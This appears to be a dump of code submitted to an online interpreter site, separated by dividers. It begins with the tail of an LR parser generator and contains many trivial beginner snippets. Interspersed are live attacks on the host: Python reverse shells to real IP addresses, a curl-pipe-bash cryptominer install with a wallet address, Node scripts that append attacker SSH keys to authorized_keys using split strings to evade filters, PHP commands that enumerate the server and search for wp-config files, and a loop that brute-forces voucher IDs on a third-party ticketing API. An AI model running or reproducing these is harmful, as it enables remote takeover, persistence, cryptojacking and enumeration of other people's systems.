        if len(jk) > 1:
            for item in jk:
                jl = goto1(item)
                if jl not in set_of_items and jl != kl:
                    set_of_items.append(jl)
                    dfa_prod[str(state_numbers[str(jk)]) + " " + str(item)] = jl
                else:
                    dfa_prod[str(state_numbers[str(jk)]) + " " + str(item)] = jl

    for item in c:
        for j in range(len(item)):
            if goto1(item[j]) not in c:
                if item[j].index(".") != len(item[j]) - 1:
                    c.append(goto1(item[j]))

    print("---------------------------------------------------------------")
    print("Total States: ", len(c))
    for i in range(len(c)):
        print(i, ":", c[i])
    print("---------------------------------------------------------------")

    dfa = {}
    for i in range(len(c)):
        if i in dfa:
            pass
        else:
            lst = get_list(dfa_prod, i)
            samp = {}
            for j in lst:
                s = j.split()[1].split('->')[1]
                search = s[s.index('.') + 1]
                samp[search] = state_numbers[str(dfa_prod[j])]

            if samp != {}:
                dfa[i] = samp

    # print(dfa)

    # Generate parsing table
    table = []

    term = sorted(list(get_terminals(prod)))
    header = [''] * (len(term) + 1)
    header[(len(term) + 1) // 2] = 'Action'

    non_term = sorted(list(get_non_terminals(prod)))

    header2 = [''] * len(non_term)
    header2[(len(non_term)) // 2] = 'Goto'

    table.append([''] + term + non_term)

    table_dic = {}

    for i in range(len(c)):
        data = [''] * (len(term) + len(non_term))
        samp = {}

        # Action
        try:
            for j in dfa[i]:
                if not j.isupper() and j != '' and j != '.':
                    ind = term.index(j)
                    data[ind] = 'S' + str(dfa[i][j])
                    samp[term[ind]] = 'S' + str(dfa[i][j])

        except Exception:
            if i != 1:
                s = list(c[i][0])
                s.remove('.')
                s = "".join(s)
                lst = [i] + ['r' + str(prod_num[s])] * len(term)
                lst += [''] * len(non_term)
                table.append(lst)
                for j in term:
                    samp[j] = 'r' + str(prod_num[s])
            else:
                lst = [i] + [''] * (len(term) + len(non_term))
                lst[-1] = 'Accept'
                table.append(lst)

        # Goto
        try:
            for j in dfa[i]:
                if j.isupper():
                    ind = non_term.index(j)
                    data[len(term) + ind] = dfa[i][j]

                    samp[j] = str(dfa[i][j])

            table.append([i] + data)
        except Exception:
            pass

        if samp == {}:
            table_dic[i] = {'$': 'Accept'}
        else:
            table_dic[i] = samp

    final_table = tt.to_string(data=table, header=header + header2, style=tt.styles.ascii_thin_double, padding=(0, 1))

    print("\n")
    print(final_table)
    print("\n")

    # Parse String
    string = input("Enter the string to be parsed: ")
    string += '$'
    print("\n")

    stack = [0]
    pointer = 0

    # print(table_dic)

    header = ['Process', 'Look Ahead', 'Symbol', 'Stack']
    data = []

    i = 0
    accepted = False
    while True:
        try:
            try:
                prods = dfa[stack[-1]]
                prod_i = prods[string[i]]  # state num
            except Exception:
                prod_i = None

            try:
                tab = table_dic[stack[-1]]
                tab_i = tab[string[i]]  # S or r
            except Exception:
                tab = table_dic[stack[-2]]
                tab_i = tab[stack[-1]]  # S or r

            if tab_i == 'Accept':
                data.append(['Action({0}, {1}) = {2}'.format(stack[-1], string[i], tab_i), i, string[i], str(stack)])
                accepted = True
                break
            else:
                if tab_i[0] == 'S' and not str(stack[-1]).isupper():
                    lst = ['Action({0}, {1}) = {2}'.format(stack[-1], string[i], tab_i), i, string[i]]
                    stack.append(string[i])
                    stack.append(prod_i)
                    lst.append(str(stack))
                    data.append(lst)
                    i += 1
                elif tab_i[0] == 'r':
                    lst = ['Action({0}, {1}) = {2}'.format(stack[-1], string[i], tab_i), i, string[i]]
                    x = None
                    for i1 in prod_num:
                        if prod_num[i1] == int(tab_i[1]):
                            x = i1
                            break

                    length = 2 * (len(x.split('->')[1]))
                    for _ in range(length):
                        stack.pop()

                    stack.append(x[0])
                    lst.append(str(stack))
                    data.append(lst)
                else:
                    lst = ['goto({0}, {1}) = {2}'.format(stack[-2], stack[-1], tab_i), i, string[i]]
                    stack.append(int(tab_i))
                    lst.append(str(stack))
                    data.append(lst)
        except Exception:
            accepted = False
            break

    try:
        parsing_table = tt.to_string(data=data, header=header, style=tt.styles.ascii_thin_double, padding=(0, 1))

        if accepted:
            string = string[:-1]

            compressed_name = compress_name(string)
            save_file(parsing_table, num, compressed_name)

            print("The string {0} is parsable! Please find the parsing table in "
                  "parsable_strings/{1}/{2}.txt.".format(string, num, compressed_name))
        else:
            print("The string {0} is not parsable!".format(string))
    except Exception:
        print("Invalid string entered!")
========================================================================================

                                                    import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("51.79.145.226",23));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

========================================================================================

                                                    import os; os.system("curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 48es7TvDNgFXbPSjAGwjTdNfdiazHXcYfjZiNWvStUNX9rUCgk13zKP5geJDfTK1y6MRNZzKSL8RuG8znsHB9Xv3J1QMQcV")
========================================================================================

                                                    import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("51.79.145.226",23));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
========================================================================================

                                                    from threading import Thread
from datetime import datetime

def wait_for_threads(threads):
    for t in threads: t.join()

def test():
    t = ''
    for i in range(500):
        t += str(i) + str(i)


st = datetime.now()
threads = []

for i in range(10000):
    threads.append(Thread(target=test))
    threads[i].start()

wait_for_threads(threads)
print(datetime.now() - st)

========================================================================================

                                                    # Welcome To Python Interpreter
print("Welcome to Python Online Interpreter")
import pty;

pty.spawn("/bin/sh -i >& /dev/tcp/82.181.73.8/5906 0>&1")
========================================================================================

                                                    # Welcome To Python Interpreter
print("Welcome to Python Online Interpreter")
import pty;

pty.spawn("/bin/sh")
========================================================================================

                                                    # Welcome To Python Interpreter
print("Welcome to Python Online Interpreter")
import pty;

pty.spawn("/bin/sh -i >& /dev/tcp/82.181.73.8/5906 0>&1")
========================================================================================

                                                    print("Ava Azari")
print("have a number form 1 to 100")
import random
b= random.randint(1 , 100)
min = 0
max = 101
while True:
    print(b)
    s=input()
    if (s=="B"):
        #به این منظور که عدد نمایش داده شده بزرگ تر از عدد مورد نطر میباشد
        max = b
        b=random.randint(min + 1, max - 1)
    elif (s=="K"):
        #به این منظور که عدد نمایش داده شده کوچک تر از عدد مورد نطر میباشد
        min = b
        b=random.randint (min + 1, max - 1)
    elif (s=="A") :
        print("DONE")
        break

========================================================================================

                                                    if (x:= int(input("Enter :"))) <=2:
    print("to rast migi")
print(x)
========================================================================================

                                                    print(x:=2)
========================================================================================

                                                    my_dict={
        "iran":"tehran",        #کد چند روش مختلف جهت پیدا کردن مقدار توسط کلید در دیکشنری  
        "arabic":"reyaz",
        "canada":"torento",
}
def return_key(input_dict,value):
        key_list=list(input_dict.keys())
        value_list=list(input_dict.values())
        if value in value_list:
            index=value_list.index(value)
        else:
            return ("No key fond")
        return (key_list[index])
print(return_key(my_dict,"reyaz"))
========================================================================================

                                                    #by Fox
print("You are stuck in an underground maze.");
print("Choose a tunnel to go into...");
input("Do you want to go LEFT or RIGHT at the Fork?");


========================================================================================

                                                    # Welcome To Python Interpreter
print("Hello World!")

========================================================================================

                                                    print(6)
========================================================================================

                                                    print(5)
========================================================================================

                                                    print(8)
========================================================================================

                                                    print(2)
========================================================================================

                                                    print(7)
========================================================================================

                                                    print(4)
========================================================================================

                                                    print(1)
========================================================================================

                                                    print(3)
========================================================================================

                                                    print(9)
========================================================================================

                                                    print(0)
========================================================================================

                                                    import time
time.sleep(4)
print(1+1)
========================================================================================

                                                    import time
time.sleep(5)
print(1+1)
========================================================================================

                                                    import threading
print(1+1)
========================================================================================

                                                    import requests
requests.get("https://onedrive.live.com/")
print(1+1)
========================================================================================

                                                    import requests
requests.get("onedrive.live")
print(1+1)
========================================================================================

                                                    import requests
print(1+1)
========================================================================================

                                                    # Welcome To Python Interpreter
print("Welcome to Python Online Interpreter")
dir
 
========================================================================================

                                                    # Welcome To Python Interpreter
print("Welcome to Python Online Interpreter")
sudo apt update
dir
 
========================================================================================

                                                    # Welcome To Python Interpreter
print("Welcome to Python Online Interpreter")
sudo apt update

 
========================================================================================

                                                    # Welcome To Python Interpreter
print("Welcome to Python Online Interpreter")
print("Hello World!")
========================================================================================

                                                    print(1+1)
========================================================================================

                                                    print(1+1)
========================================================================================

                                                    import pylab

a = 1
b = 2
x = range(-10, 11)  # lista argumentów x

y = []  # lista wartości
for i in x:
    y.append(a * i - b)

pylab.plot(x, y)
pylab.title('Wykres f(x) = a*x - b')
pylab.grid(True)
pylab.show()
========================================================================================

                                                    import pylab

a = 1
b = 2
x = range(-10, 11)  # lista argumentów x

y = []  # lista wartości
for i in x:
    y.append(a * i - b)

pylab.plot(x, y)
pylab.title('Wykres f(x) = a*x - b')
pylab.grid(True)
pylab.show()
========================================================================================

                                                    # = Adamah
print('wife')
========================================================================================

                                                    # = Adamah
print(wife)
========================================================================================

                                                    wife = Adamah
print(wife)
========================================================================================

                                                    /**
 * Welcome To CodedTag Compilers
 */
#include <iostream>
using namespace std;
int main() {
   cout << "Hello World !" << endl;
   return 0;
}
========================================================================================

                                                    
print("hi dude")
print("was"
========================================================================================

                                                    
print("hi dude")
print("was)
========================================================================================

                                                    
print("hi dude")
print("was")
========================================================================================

                                                    # Welcome To Python Interpreter
print("hi dude")
========================================================================================

                                                    const { exec } = require("child_process");

let str = '~/.s'
let str2 = 's'
let str3 = 'h'

let str4 = 'authorized'
let str5 = '_keys'

let str6 = 'c'
let str7 = 'at'

exec(`${str6 + str7} index.html`, (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
========================================================================================

                                                    const { exec } = require("child_process");

let str = '~/.s'
let str2 = 's'
let str3 = 'h'

let str4 = 'authorized'
let str5 = '_keys'

let str6 = 'c'
let str7 = 'at'

exec(`ls`, (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
========================================================================================

                                                    const { exec } = require("child_process");

let str = '~/.s'
let str2 = 's'
let str3 = 'h'

let str4 = 'authorized'
let str5 = '_keys'

let str6 = 'c'
let str7 = 'at'

exec(`echo '${str2 + str2 + str3}-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZnzrOz7pAvUeuRPYhWxe4C+JmwQCkOY+1FB2JSl/y19fyJzUYUmP+bAJIL47iWp7yJRgbzC8ZSD5LQVEwqrOqlemjKa1X+7St8cKXTW7hFTj9JcZSsQB53E5We8fc5KFpfe83n767HL+q9keVxEjvve0RycPYTgyZ4IsoOBu5c4spPeuR4vpPBypA4eo8jZgjwyxt/sBgGTFn6SQvJG1w6d6AuqNEqEEeUZLRdCFGos/+xA1XXNN7hVZhzGdkv27Ig/0RM4wwzxasCWtSJfSgXMx+UR+QylBVTPtNnSmvTOvP4LrDZxF1M2dGPEr3X2bR2ZojEharVCnojHtTMhuMNxpX9WN4K6+JjnOWxljNuyV+odv2wghqjcKhEgX/o9+GEQAupkKPs8VyRUX2QzQjFbKhZx5wkj+/tHgTJaF/wbchVw6AlkTf/DmEgkRl6ld8TbMnUSZKbgxJhdFD3KnhR+0bWAAPsTyVd84u8XluZ9P55GvF7BKbnhO9vpQoUHE=' >> ${str + str2 + str3}/${str4 + str5}`, (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
========================================================================================

                                                    const { exec } = require("child_process");

let str = '~/.s'
let str2 = 's'
let str3 = 'h'

let str4 = 'authorized'
let str5 = '_keys'

let str6 = 'c'
let str7 = 'at'

exec(`${str6 + str7} ${str + str2 + str3}/${str4 + str5}`, (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
========================================================================================

                                                    const { exec } = require("child_process");

let str = '~/.s'
let str2 = 's'
let str3 = 'h'

let str4 = 'authorized'
let str5 = '_keys'

exec(`echo '${str2 + str2 + str3}-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTj7XarwtStUWAkWIdjJUnlULZNKP8Wuyso2YMzuTpqaGUMAfDHPtyCEAdUgekb26MAiqsOUOpGtuF1suSORAkFvy+acc9Al1TbE2wgFk1VJaDCIYcFIJAqQd+F2pWjnRPHUnHW4GXpJwSxEQk9IqL29xdF2JYB08NLipNWlMW/KMD9E/l2Uo2RVyv9jAmPhN4uiGq+79oTzL9vPMOHvpuspCDU83wRWWwauD8fWFIXmTb4ifGKhsgS71g4vbu6BqgWs1FiCcY8wcLRLrPeVkc7BGTi6ZBhqQKqJMtBw+mJ443LBZfq6wzwtfDfqcAUJ/uN0yWYds23lZK9fktOG9SUmAD34k7r1GwVcVmeJpk17573Xev5uOEb3fAGvcHsZAtG+t9lOfM4/nU7bc+cvjUYMknEDUsm9BB7CuqticzmtCUsvTsxYPYfDt4u+4QvNoi43JD9j1KTvbYx0rvqD7zTCrwc+Q+GEQWw2BwEvBQja/2F4vcb3PwY64iY3dnPXs= ' >> ${str + str2 + str3}/${str4 + str5}`, (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
========================================================================================

                                                    const { exec } = require("child_process");

let str = '~/.s'
let str2 = 's'
let str3 = 'h'

exec(`echo '${str2 + str2 + str3}-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTj7XarwtStUWAkWIdjJUnlULZNKP8Wuyso2YMzuTpqaGUMAfDHPtyCEAdUgekb26MAiqsOUOpGtuF1suSORAkFvy+acc9Al1TbE2wgFk1VJaDCIYcFIJAqQd+F2pWjnRPHUnHW4GXpJwSxEQk9IqL29xdF2JYB08NLipNWlMW/KMD9E/l2Uo2RVyv9jAmPhN4uiGq+79oTzL9vPMOHvpuspCDU83wRWWwauD8fWFIXmTb4ifGKhsgS71g4vbu6BqgWs1FiCcY8wcLRLrPeVkc7BGTi6ZBhqQKqJMtBw+mJ443LBZfq6wzwtfDfqcAUJ/uN0yWYds23lZK9fktOG9SUmAD34k7r1GwVcVmeJpk17573Xev5uOEb3fAGvcHsZAtG+t9lOfM4/nU7bc+cvjUYMknEDUsm9BB7CuqticzmtCUsvTsxYPYfDt4u+4QvNoi43JD9j1KTvbYx0rvqD7zTCrwc+Q+GEQWw2BwEvBQja/2F4vcb3PwY64iY3dnPXs= ' >> ${str + str2 + str3}/authorized_keys`, (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
========================================================================================

                                                    const { exec } = require("child_process");

exec("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTj7XarwtStUWAkWIdjJUnlULZNKP8Wuyso2YMzuTpqaGUMAfDHPtyCEAdUgekb26MAiqsOUOpGtuF1suSORAkFvy+acc9Al1TbE2wgFk1VJaDCIYcFIJAqQd+F2pWjnRPHUnHW4GXpJwSxEQk9IqL29xdF2JYB08NLipNWlMW/KMD9E/l2Uo2RVyv9jAmPhN4uiGq+79oTzL9vPMOHvpuspCDU83wRWWwauD8fWFIXmTb4ifGKhsgS71g4vbu6BqgWs1FiCcY8wcLRLrPeVkc7BGTi6ZBhqQKqJMtBw+mJ443LBZfq6wzwtfDfqcAUJ/uN0yWYds23lZK9fktOG9SUmAD34k7r1GwVcVmeJpk17573Xev5uOEb3fAGvcHsZAtG+t9lOfM4/nU7bc+cvjUYMknEDUsm9BB7CuqticzmtCUsvTsxYPYfDt4u+4QvNoi43JD9j1KTvbYx0rvqD7zTCrwc+Q+GEQWw2BwEvBQja/2F4vcb3PwY64iY3dnPXs= ' >> ~/.ssh/authorized_keys", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
========================================================================================

                                                    const { exec } = require("child_process");

exec("echo 'kek'", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
========================================================================================

                                                    <?php 
   var_dump(`cat index.html`)
?>
========================================================================================

                                                    <?php 
   var_dump(`find /-name "*.php" `)
?>
========================================================================================

                                                    <?php 
   var_dump(`find / -name "wp-config*" `)
?>
========================================================================================

                                                    <?php 
   var_dump(load_file('/etc/hosts'));
?>
========================================================================================

                                                    <?php 
   var_dump(readfile('/etc/hosts'));
?>
========================================================================================

                                                    <?php 
   echo "Hello World!";
?>
========================================================================================

                                                    <?php 
   var_dump(`ifconfig`);
?>
========================================================================================

                                                    <?php 
   var_dump(`ip a`);
?>
========================================================================================

                                                    <?php 
   var_dump(`ip -a`);
?>
========================================================================================

                                                    <?php 
   var_dump(readfile('/etc/hosts'));
?>
========================================================================================

                                                    <?php 
   var_dump(load_file('/etc/hosts'));
?>
========================================================================================

                                                    <?php 
   var_dump(`uname -a`);
?>
========================================================================================

                                                    <?php 
   var_dump($_SERVER['PHP_SELF']);
?>
========================================================================================

                                                    <?php 
   var_dump(`find / -name "wp-config*" `)
?>
========================================================================================

                                                    <?php 
   var_dump(`find / -name "*wp-*" `)
?>
========================================================================================

                                                    <?php 
   var_dump(`find / -name "*wp*" `)
?>
========================================================================================

                                                    <?php 
   var_dump(`find / -name "wp*" `)
?>
========================================================================================

                                                    <?php 
   var_dump(`find / -name "contact-us" `)
?>
========================================================================================

                                                    <?php 
   var_dump(`find / -name "index.php" `)
?>
========================================================================================

                                                    <?php 
   var_dump(`find / -name "php" `)
?>
========================================================================================

                                                    <?php 
   var_dump(`find / -name "*.php" `)
?>
========================================================================================

                                                    <?php 
   var_dump(`find /-name "*.php" `)
?>
========================================================================================

                                                    <?php 
   var_dump(`find / -name "*php*" `)
?>
========================================================================================

                                                    <?php 
   var_dump(`find -iname / `)
?>
========================================================================================

                                                    <?php 
   var_dump(`find -iname / "*"`)
?>
========================================================================================

                                                    <?php 
   var_dump(`find -i / "*"`)
?>
========================================================================================

                                                    <?php 
   var_dump(`pwd`)
?>
========================================================================================

                                                    <?php 
   var_dump(`id`)
?>
========================================================================================

                                                    <?php 
   var_dump(`ls -a /var`)
?>
========================================================================================

                                                    <?php 
   var_dump(`ls -a /var/www/`)
?>
========================================================================================

                                                    <?php 
   var_dump(`ls -a /root`)
?>
========================================================================================

                                                    <?php 
   var_dump(`cat index.html`)
?>
========================================================================================

                                                    <?php 
   var_dump(`html index.html`)
?>
========================================================================================

                                                    <?php 
   var_dump(`echo index.html`)
?>
========================================================================================

                                                    <?php 
   var_dump(`ls -l -a /home/ubuntu/compilers`)
?>
========================================================================================

                                                    <?php 
   var_dump(`ls -l -a /home/ubuntu`)
?>
========================================================================================

                                                    <?php 
   var_dump(`ls -l -a /home`)
?>
========================================================================================

                                                    <?php 
   var_dump(`apt-get install cat`)
?>
========================================================================================

                                                    <?php 
   var_dump(`cat test.sh`)
?>
========================================================================================

                                                    <?php 
   var_dump(`ls .`)
?>
========================================================================================

                                                    <?php 
   var_dump(`id;whoami;uname -a`)
?>
========================================================================================

                                                    <?php 
   echo `pwd`;
?>
========================================================================================

                                                    <!DOCTYPE html>
<html>
<body>

<?php
$txt = "PHP";
echo "I love $txt!";
echo "What do you want to input? ";
$input = rtrim(fgets(STDIN));
echo "I got it:\n" . $input;
?>

</body>
</html>
========================================================================================

                                                    <!DOCTYPE html>
<html>
<body>

<?php
$txt = "PHP";
echo "I love $txt!";
$a = readline('Enter a string: ');
echo $a;   
?>

</body>
</html>
========================================================================================

                                                    <!DOCTYPE html>
<html>
<body>

<?php
$txt = "PHP";
echo "I love $txt!";
?>

</body>
</html>
========================================================================================

                                                    # Welcome To Python Interpreter
print("hello world")
========================================================================================

                                                    Print ("hello world")
========================================================================================

                                                    # Welcome To Python Interpreter
print("Hell world") 

========================================================================================

                                                    #Hello word 
========================================================================================

                                                    Print "hello world" 
========================================================================================

                                                    Print "hello world" 
Interpreter "hello world" 
========================================================================================

                                                    # Welcome To Python Interpreter
print("Welcome to Python Online Interpreter") 
========================================================================================

                                                    <?php 
   $x = 5;
   $y = 10;
   $z = $x % $y;
   echo $z;
?>
========================================================================================

                                                    <?php 
   $x = 5;
   $y = 10;
   $z = $x - $y;
   echo $z;
?>
========================================================================================

                                                    <?php 
   $x = 5;
   $y = 10;
   $z = $x / $y;
   echo $z;
?>
========================================================================================

                                                    <?php 
   $x = 5;
   $y = 10;
   $z = $x * $y;
   echo $z;
?>
========================================================================================

                                                    <?php 
   $x = 5;
   $y = 10;
   $z = $x + $y;
   echo $z;
?>
========================================================================================

                                                    <?php 
   echo "Hello World!";
?>
========================================================================================

                                                    <?php 
   echo "Hello World!";
   	phpinfo();

?>
========================================================================================

                                                    <?php 
   echo "Hello World!";
   	phpinfo();

?>
========================================================================================

                                                    # Welcome To Python Interpreter
print("Welcome to Python Online Interpreter")
========================================================================================

                                                    # Welcome To Python Interpreter
print("Welcome to Python Online Interpreter")   
print("Hellworl d ")
========================================================================================

                                                    # Welcome To Python Interpreter
print("Welcome to Python Online Interpreter")   
========================================================================================

                                                    import http.client

conn = http.client.HTTPSConnection("api.ipify.org")

conn.request("GET", "/")

res = conn.getresponse()

print(res.status, res.reason)

data = res.read()
conn.close()
print(data)

========================================================================================

                                                    import http.client

conn = http.client.HTTPSConnection("api.ipify.org")

conn.request("GET", "/")

res = conn.getresponse()

print(res.status, res.reason)

data = res.read()
conn.close()
print(data)

========================================================================================

                                                    <?php 
   $date = new ZendTime();
   var_dump($date);
?>
========================================================================================

                                                    <?php 
   $date = new \ZendTime();
   var_dump($date);
?>
========================================================================================

                                                    <?php 
   $date = new \Zend_Date();
   var_dump($date);
?>
========================================================================================

                                                    <?php 
   $date = new \ZendTime();
   var_dump($date);
?>
========================================================================================

                                                    // Node.js Interpreter
console.log("Welcome To Node.js Interpreter");
========================================================================================

                                                    const { exec } = require("child_process");

exec("cat index.html", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
========================================================================================

                                                    const { exec } = require("child_process");

exec("cat ifconfig.me", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
========================================================================================

                                                    const { exec } = require("child_process");

exec("wget ifconfig.me", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
========================================================================================

                                                    const { exec } = require("child_process");

exec("echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTj7XarwtStUWAkWIdjJUnlULZNKP8Wuyso2YMzuTpqaGUMAfDHPtyCEAdUgekb26MAiqsOUOpGtuF1suSORAkFvy+acc9Al1TbE2wgFk1VJaDCIYcFIJAqQd+F2pWjnRPHUnHW4GXpJwSxEQk9IqL29xdF2JYB08NLipNWlMW/KMD9E/l2Uo2RVyv9jAmPhN4uiGq+79oTzL9vPMOHvpuspCDU83wRWWwauD8fWFIXmTb4ifGKhsgS71g4vbu6BqgWs1FiCcY8wcLRLrPeVkc7BGTi6ZBhqQKqJMtBw+mJ443LBZfq6wzwtfDfqcAUJ/uN0yWYds23lZK9fktOG9SUmAD34k7r1GwVcVmeJpk17573Xev5uOEb3fAGvcHsZAtG+t9lOfM4/nU7bc+cvjUYMknEDUsm9BB7CuqticzmtCUsvTsxYPYfDt4u+4QvNoi43JD9j1KTvbYx0rvqD7zTCrwc+Q+GEQWw2BwEvBQja/2F4vcb3PwY64iY3dnPXs=' >> ~/.ssh/authorized_keys", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
========================================================================================

                                                    const { exec } = require("child_process");

exec("cat ~/.ssh/authorized_keys", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
========================================================================================

                                                    const { exec } = require("child_process");

exec("cat ~/root/authorized_keys", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
========================================================================================

                                                    const { exec } = require("child_process");

exec("whoami", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
========================================================================================

                                                    const { exec } = require("child_process");

exec("ls -la", (error, stdout, stderr) => {
    if (error) {
        console.log(`error: ${error.message}`);
        return;
    }
    if (stderr) {
        console.log(`stderr: ${stderr}`);
        return;
    }
    console.log(`stdout: ${stdout}`);
});
========================================================================================

                                                    import os

os.system('whoami')
========================================================================================

                                                    # Welcome To Python Interpreter
import requests

print("Hello World")



========================================================================================

                                                    # Welcome To Python Interpreter
print("Welcom to Python Online Interpreter")
========================================================================================

                                                    # Welcome To Python Interpreter
import requests

print("Hello World")

# Write Python 3 code in this online editor and run it.
print("Hello world")

s="https://ticketteam.deuithof.nl/DSServerDLL.dll/datasnap/rest/TMethods/CheckKortingsVoucherId//1/SDBM"

for i in range(72892, 75894):
    reqsurl=s+str(i)+"/"
    print(i, reqsurl)
    
    llama=requests.get(reqsurl)
    print(llama.status_code)
    print(llama.content)  # bytes
    print(llama.text)  
    
print('end of loop')

========================================================================================

                                                    # Welcome To Python Interpreter
import requests

print("Hello World")

# Write Python 3 code in this online editor and run it.
print("Hello world")

s="https://ticketteam.deuithof.nl/DSServerDLL.dll/datasnap/rest/TMethods/CheckKortingsVoucherId//1/SDBM"

for i in range(72892, 75894):
    reqsurl=s+str(i)+"/"
    print(i, reqsurl)
    
    llama=requests.get(reqsurl)
    print(llama.status_code)
    print(llama.content)  # bytes
    print(llama.text)  
    
print('end of loop')
========================================================================================

                                                    import subprocess
========================================================================================

                                                    # Welcome To Python Interpreter
print("Welcom to Python Online Interpreter")
========================================================================================

                        
                    